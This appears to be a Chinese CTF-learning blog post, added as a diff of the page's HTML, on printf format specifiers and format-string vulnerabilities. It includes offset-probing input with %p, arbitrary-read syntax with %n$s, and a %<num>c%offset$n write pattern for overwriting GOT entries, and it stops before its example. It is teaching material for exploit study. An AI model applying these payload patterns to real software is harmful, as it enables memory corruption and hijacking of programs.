@@ -1,0 +1,287 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="alternate" href="/rss.xml" title="此时相望不相闻，愿逐月华流照君" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="此时相望不相闻，愿逐月华流照君" type="application/atom+xml"><link rel="alternate" type="application/json" title="此时相望不相闻，愿逐月华流照君" href="https://cyb141520.github.io/feed.json"><link rel="preconnect" href="https://s4.zstatic.net"><link rel="preconnect" href="https://at.alicdn.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&amp;display=swap&amp;subset=latin,latin-ext" media="none" onload="this.media='all'"><link rel="modulepreload" href="/js/siteInit.js"><link rel="modulepreload" href="/js/nyx-player-GAYVXOT2.js"><link rel="modulepreload" href="/js/copy-tex-ZB3YLK4M.js"><link rel="modulepreload" href="/js/post-IGXPDX6N.js"><link rel="modulepreload" href="/js/chunk-2MYORO2B.js"><link rel="modulepreload" href="/js/pagefind-U2ETNMP3.js"><link rel="modulepreload" href="/js/index.esm-LV2XXO35.js"><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"><link rel="modulepreload" href="/js/chunk-QNA7Z54Y.js"><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media='all'"><link rel="preload" href="https://sat.huijiwiki.com/wiki/%E6%96%87%E4%BB%B6:Shooting_star.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://1on1.today/blog/wp-content/uploads/2021/04/%E7%82%BA%E4%BB%80%E9%BA%BC-%E6%9C%89%E6%B5%81%E6%98%9F-%E6%B5%81%E6%98%9F%E9%9B%A8-%E6%98%AF%E4%BB%80%E9%BA%BC-%E5%A6%82%E4%BD%95-%E7%94%A2%E7%94%9F.png" as="image" fetchpriority="high"><link rel="preload" href="https://starwalk.space/gallery/images/meteor-showers-landscape-1/1140x641.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://1on1.today/blog/wp-content/uploads/2021/04/%E7%82%BA%E4%BB%80%E9%BA%BC-%E6%9C%89%E6%B5%81%E6%98%9F-%E6%B5%81%E6%98%9F%E9%9B%A8-%E6%98%AF%E4%BB%80%E9%BA%BC-%E5%A6%82%E4%BD%95-%E7%94%A2%E7%94%9F.png" as="image" fetchpriority="high"><link rel="preload" href="https://pweb.cwa.gov.tw/PopularScience/images/02_SubjectMaterial/02_sky/02_sky_02/02_sky_02_S.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://sat.huijiwiki.com/wiki/%E6%96%87%E4%BB%B6:Shooting_star.jpg" as="image" fetchpriority="high"><meta name="keywords" content="pwn,"><link rel="canonical" href="https://cyb141520.github.io/2025/08/06/pwn%E4%B8%93%E6%A0%8F/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E_new/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>格式化字符串</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope="" itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope="" itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">格式化字符串</h1><div class="meta"><span class="item" title="创建时间：2025-08-06 19:23:15"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2025-08-06T19:23:15+08:00">2025-08-06</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>6.6k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>6 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">vvwwv</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;https://sat.huijiwiki.com/wiki/%E6%96%87%E4%BB%B6:Shooting_star.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://1on1.today/blog/wp-content/uploads/2021/04/%E7%82%BA%E4%BB%80%E9%BA%BC-%E6%9C%89%E6%B5%81%E6%98%9F-%E6%B5%81%E6%98%9F%E9%9B%A8-%E6%98%AF%E4%BB%80%E9%BA%BC-%E5%A6%82%E4%BD%95-%E7%94%A2%E7%94%9F.png&quot;);"></li><li class="item" style="background-image: url(&quot;https://starwalk.space/gallery/images/meteor-showers-landscape-1/1140x641.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://1on1.today/blog/wp-content/uploads/2021/04/%E7%82%BA%E4%BB%80%E9%BA%BC-%E6%9C%89%E6%B5%81%E6%98%9F-%E6%B5%81%E6%98%9F%E9%9B%A8-%E6%98%AF%E4%BB%80%E9%BA%BC-%E5%A6%82%E4%BD%95-%E7%94%A2%E7%94%9F.png&quot;);"></li><li class="item" style="background-image: url(&quot;https://pweb.cwa.gov.tw/PopularScience/images/02_SubjectMaterial/02_sky/02_sky_02/02_sky_02_S.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://sat.huijiwiki.com/wiki/%E6%96%87%E4%BB%B6:Shooting_star.jpg&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemlistelement="" itemscope="" itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于CTF"><span itemprop="name">CTF<meta itemprop="position" content="0"></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CTF/%E4%B8%93%E6%A0%8F/" itemprop="item" rel="index" title="分类于专栏"><span itemprop="name">专栏<meta itemprop="position" content="1"></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://cyb141520.github.io/2025/08/06/pwn%E4%B8%93%E6%A0%8F/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E_new/"><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"><meta itemprop="name" content="vvwwv"><meta itemprop="description" content=", "></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="此时相望不相闻，愿逐月华流照君"></span><div class="body md" itemprop="articleBody"><h1 id="格式化字符串函数介绍"><a class="anchor" href="#格式化字符串函数介绍">#</a> 格式化字符串函数介绍</h1>
+<p>参考ctf wiki：</p>
+<p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串（也就是</strong><code>格式参数说明符</code><strong>,例如</strong><code>%s</code><strong>、</strong><code>%c</code><strong>），根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分:</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数，可选</li>
+</ul>
+<p>例子：（这个例子中在<code>第一个参数</code>中设立了<code>三个格式参数说明符</code>，将后续的三个参数按相应格式进行转化）</p>
+<p><img loading="lazy" src="https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/printf.png" alt=""></p>
+<h2 id="格式化字符串函数"><a class="anchor" href="#格式化字符串函数">#</a> 格式化字符串函数</h2>
+<p>常见的格式化字符串函数：</p>
+<ul>
+<li>输入：
+<ul>
+<li>scanf</li>
+</ul>
+</li>
+<li>输出：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">函数</th>
+<th style="text-align:center">基本介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">printf</td>
+<td style="text-align:center">输出到 stdout</td>
+</tr>
+<tr>
+<td style="text-align:center">fprintf</td>
+<td style="text-align:center">输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td style="text-align:center">vprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td style="text-align:center">vfprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td style="text-align:center">sprintf</td>
+<td style="text-align:center">输出到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">snprintf</td>
+<td style="text-align:center">输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">vsprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">vsnprintf</td>
+<td style="text-align:center">根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">setproctitle</td>
+<td style="text-align:center">设置 argv</td>
+</tr>
+<tr>
+<td style="text-align:center">syslog</td>
+<td style="text-align:center">输出日志</td>
+</tr>
+<tr>
+<td style="text-align:center">err, verr, warn, vwarn 等</td>
+<td style="text-align:center">。。。</td>
+</tr>
+</tbody>
+</table>
+<h2 id="格式化字符串"><a class="anchor" href="#格式化字符串">#</a> 格式化字符串</h2>
+<p>格式化字符串的基本格式如下：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-c"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">%</span><span style="color:#2993a3;--shiki-dark:#5eaab5">[</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">parameter</span><span style="color:#2993a3;--shiki-dark:#5eaab5">]</span><span style="color:#2993a3;--shiki-dark:#5eaab5">[</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">flags</span><span style="color:#2993a3;--shiki-dark:#5eaab5">]</span><span style="color:#2993a3;--shiki-dark:#5eaab5">[</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">field width</span><span style="color:#2993a3;--shiki-dark:#5eaab5">]</span><span style="color:#2993a3;--shiki-dark:#5eaab5">[</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">.precision</span><span style="color:#2993a3;--shiki-dark:#5eaab5">]</span><span style="color:#2993a3;--shiki-dark:#5eaab5">[</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">length</span><span style="color:#2993a3;--shiki-dark:#5eaab5">]</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">type</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//例如：</span></span>
+<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">printf</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">%</span><span style="color:#B56959;--shiki-dark:#C98A7D">2$#[field width][.precision][length]d</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">16</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">17</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//输出：17【这里利用n$，指定了使用后面的第几个参数】</span></span></code></pre>
+<p>各个格式含义如下：</p>
+<ul>
+<li><strong>Parameter</strong>可以<code>忽略</code>或者是：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>n$</code></td>
+<td style="text-align:left"><em>n_是用这个格式说明符（specifier）<code>显示第几个参数</code>；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了_parameter</em>，则其他所有占位符必须也使用_parameter_。这是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/POSIX">POSIX</a>扩展，不属于<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80">ISO C</a>。例：<code>printf("%2$d %2$#x; %1$d %1$#x",16,17)</code> 产生"<code>17 0x11; 16 0x10</code>"</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>Flags</strong>可为0个或多个：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>+</code></td>
+<td style="text-align:center">总是表示有符号数值的'<code>+</code>'或'<code>-</code>'号，缺省情况是忽略正数的符号。仅适用于数值类型。</td>
+</tr>
+<tr>
+<td style="text-align:center"><em>空格</em></td>
+<td style="text-align:center">使得有符号数的输出如果没有正负号或者输出0个字符，则<code>前缀1个空格</code>。如果空格与'+'同时出现，则空格说明符被忽略。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-</code></td>
+<td style="text-align:center">左对齐。缺省情况是右对齐。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>#</code></td>
+<td style="text-align:center">对于'<code>g</code>'与'<code>G</code>'，不删除尾部0以表示精度。对于'<code>f</code>', '<code>F</code>', '<code>e</code>', '<code>E</code>', '<code>g</code>', '<code>G</code>', 总是输出小数点。对于'<code>o</code>', '<code>x</code>', '<code>X</code>', 在非0数值前分别输出前缀<code>0</code>, <code>0x</code>, and <code>0X</code>表示数制。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>0</code></td>
+<td style="text-align:center">如果_width_选项前缀以<code>0</code>，则在左侧用<code>0</code>填充直至达到宽度要求。例如<code>printf("%2d", 3)</code>输出"<code> 3</code>"，而<code>printf("%02d", 3)</code>输出"<code>03</code>"。如果<code>0</code>与<code>-</code>均出现，则<code>0</code>被忽略，即左对齐依然用空格填充。</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>Field Width</strong>给出显示数值的最小宽度，典型用于制表输出时填充固定宽度的表目。实际输出字符的个数不足域宽，则根据左对齐或右对齐进行填充。实际输出字符的个数超过域宽并不引起数值截断，而是显示全部。宽度值的前导0被解释为0填充标志</li>
+<li><strong>Precision</strong>通常指明输出的_最大_长度，依赖于特定的格式化类型。对于d、i、u、x、o的整型数值，是指最小数字位数，不足的位要在左侧补0，如果超过也不截断，缺省值为1。对于a,A,e,E,f,F的浮点数值，是指小数点右边显示的数字位数，必要时四舍五入或补0；缺省值为6。对于g,G的浮点数值，是指<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9C%89%E6%95%88%E6%95%B0%E5%AD%97">有效数字</a>的最大位数；缺省值为6。对于s的字符串类型，是指输出的字节的上限，超出限制的其它字符将被截断。如果域宽为<code>*</code>，则由对应的函数参数的值为当前域宽。如果仅给出了小数点，则域宽为0。</li>
+<li><strong>Length</strong>指出浮点型参数或整型参数的长度。可以忽略</li>
+<li><strong>Type</strong>，也称转换说明（conversion specification/specifier），可以是：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>d</code>, <code>i</code></td>
+<td style="text-align:center"><code>有符号整数</code>。有符号十进制数值<code>int</code>。'<code>%d</code>'与'<code>%i</code>'对于输出是同义；但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>u</code></td>
+<td style="text-align:center"><code>无符号整数</code>。十进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>f</code>, <code>F</code></td>
+<td style="text-align:center"><code>double</code>型输出10进制<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AE%9A%E9%BB%9E">定点</a>表示。'<code>f</code>'与'<code>F</code>'差异是表示无穷与NaN时，'<code>f</code>'输出'<code>inf</code>', '<code>infinity</code>'与'<code>nan</code>'；'<code>F</code>'输出'<code>INF</code>', '<code>INFINITY</code>'与'<code>NAN</code>'。小数点后的数字位数等于精度，最后一位数字<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5">四舍五入</a>。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>e</code>, <code>E</code></td>
+<td style="text-align:center"><code>double</code>值，输出形式为10进制的([<code>-</code>]d.ddd <code>e</code>[<code>+</code>/<code>-</code>]ddd). <code>E</code>版本使用的指数符号为<code>E</code>（而不是<code>e</code>）。指数部分至少包含2位数字，如果值为0，则指数部分为<code>00</code>。Windows系统，指数部分至少为3位数字，例如<code>1.5e002</code>，也可用Microsoft版的运行时函数<code>_set_output_format</code> 修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>g</code>, <code>G</code></td>
+<td style="text-align:center"><code>double</code>型数值，精度定义为全部有效数字位数。当指数部分在<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%97%AD%E5%8C%BA%E9%97%B4">闭区间</a> [-4,5] 内，输出为定点形式；否则输出为指数浮点形式。'<code>g</code>'使用小写字母，'<code>G</code>'使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>x</code>, <code>X</code></td>
+<td style="text-align:center">16进制<code>unsigned int</code>。'<code>x</code>'使用小写字母；'<code>X</code>'使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>o</code></td>
+<td style="text-align:center">8进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>s</code></td>
+<td style="text-align:center">如果没有用l标志，输出<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=Null%E7%BB%93%E5%B0%BE%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;action=edit&amp;redlink=1">null结尾字符串【即\0】</a>直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用<code>wcrtomb</code>函数。<strong>%s需要对应的参数是地址（&amp;a这种），错误地址会触发段错误【pwn93】</strong></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>c</code></td>
+<td style="text-align:center">如果没有用l标志，把int参数转为<code>unsigned char</code>型输出；如果用了l标志，把wint_t参数转为包含两个元素的<code>wchart_t</code>数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>p</code></td>
+<td style="text-align:center"><code>void *</code>型，输出对应变量的值。printf("%p",a) 用地址的格式打印变量 a 的值，printf("%p", &amp;a) 打印变量 a 所在的地址。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>a</code>, <code>A</code></td>
+<td style="text-align:center"><code>double</code>型的16进制表示，"[−]0<strong>x</strong>h.hhhh <strong>p</strong>±d"。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。'<code>a</code>'使用小写字母，'<code>A</code>'使用大写字母。<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2#cite_note-2">[2]</a><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2#cite_note-3">[3]</a>（C++11流使用<code>hexfloat</code>输出16进制浮点数）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>n</code></td>
+<td style="text-align:center">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>%</code></td>
+<td style="text-align:center">'<code>%</code>'字面值，不接受任何flags, width, precision or length。</td>
+</tr>
+</tbody>
+</table>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%n系列</span></span>
+<span class="line"><span>构造payload 在比赛或者是 实际 漏洞利用时一次行传输这么大量的字节 会导致网络卡顿或者中断连接。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>我们再来了解下”%n“格式化字符的扩展(称不上 其实，就称为一个系列吧)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>%n 一次性写入4个字节</span></span>
+<span class="line"><span>%hn 一次性写入2个字节</span></span>
+<span class="line"><span>%hhn 一次性写入1个字节</span></span></code></pre>
+<h1 id="格式化字符串漏洞"><a class="anchor" href="#格式化字符串漏洞">#</a> 格式化字符串漏洞</h1>
+<p>约定：在printf("%d %d %d", a, b, c)中，a、b、c被称为<strong>格式化参数</strong>，其中<strong>a是第1个格式化参数</strong>，<strong>b是第2个格式化参数</strong>，<strong>c是第三个格式化参数</strong>；而字符串"%d %d %d"则是<strong>printf的第1个参数</strong><code>【这里就是用于解析的格式化符号实际上是第一个参数（如%d %d %d），a是第二个参数但是第一个格式化参数】</code></p>
+<h3 id="32位程序的格式化字符串漏洞"><a class="anchor" href="#32位程序的格式化字符串漏洞">#</a> 32位程序的格式化字符串漏洞</h3>
+<p>32位程序是利用栈来传参，实际上参数是从右向左依次入栈，栈顶不断升高（esp），对于printf函数第一个参数【用于解析的格式化符号】是最后入栈的位于栈顶，因此会将esp+4【即第二个参数】之后的数据作为匹配格式化符号的对象<code>esp处即使没有实际要打印的数据都用esp+4的数据</code>，</p>
+<p>所以想要进行一些任意读写时所用的偏移，一般都是从esp+4的地方开始算【其本身也算】</p>
+<p>算偏移：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-python"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">aaaa</span><span style="color:#AB5959;--shiki-dark:#CB7676">-%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#AB5959;--shiki-dark:#CB7676">-%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#AB5959;--shiki-dark:#CB7676">-%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#AB5959;--shiki-dark:#CB7676">-%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#AB5959;--shiki-dark:#CB7676">-%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#AB5959;--shiki-dark:#CB7676">-%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#AB5959;--shiki-dark:#CB7676">-%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#AB5959;--shiki-dark:#CB7676">-%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span></span></code></pre>
+<h4 id="任意地址读"><a class="anchor" href="#任意地址读">#</a> 任意地址读</h4>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%n$s：n$是指定显示第几个参数，使参数输出多次，s指定以字符形式输出</span></span>
+<span class="line"><span>【%偏移$输出格式】</span></span>
+<span class="line"><span>【如：%7$p，是直接输出 偏移为 7 处的内容(“0x + 16进制”)】</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>注：这里的偏移是以esp+4为第一个值开始算，也就是第一个格式化参数</span></span></code></pre>
+<h4 id="任意地址写"><a class="anchor" href="#任意地址写">#</a> 任意地址写</h4>
+<p>任意地址写主要依赖于<code>%offset$n</code>,会将已经输出的字符个数写入到<code>写入对应的整型指针参数所指的变量</code>，也就是说将偏移处内的数据作为地址，写入到该地址对应的空间中去，相当于有个指针的功效</p>
+<p>这里又要注意一个点，既然要任意地址写，那就要控制输出的长度即为要写的值，</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>需要利用`%&lt;num&gt;c`，利用字段宽度来控制总输出长度,num为多少就会补全为num，【面向的是其后面对应的参数进行补齐，比如说是esp+4的那个参数】，而不是再多打印num个字符【但实际效果是多打印num个字符，因为后面的参数不是payload里的，是栈上的被它给用】，将函数地址作为num时即可将想改写的改为想要跳转的地址</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>最终利用方式</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-python"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">目标地址</span><span style="color:#AB5959;--shiki-dark:#CB7676">%</span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">num</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">c</span><span style="color:#AB5959;--shiki-dark:#CB7676">%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">offset</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">$</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">n  【注：</span><span style="color:#AB5959;--shiki-dark:#CB7676">%</span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">num</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">c也会消耗一个参数，如果不加offset则会默认利用参数顺序使用第二个】</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">这里的目标地址可以是got表项，将其内容改写，目标地址在最前面是为了让offset的偏移值刚好对应到它在栈上的位置，然后就可以进行改写内容</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">例如：</span></span>
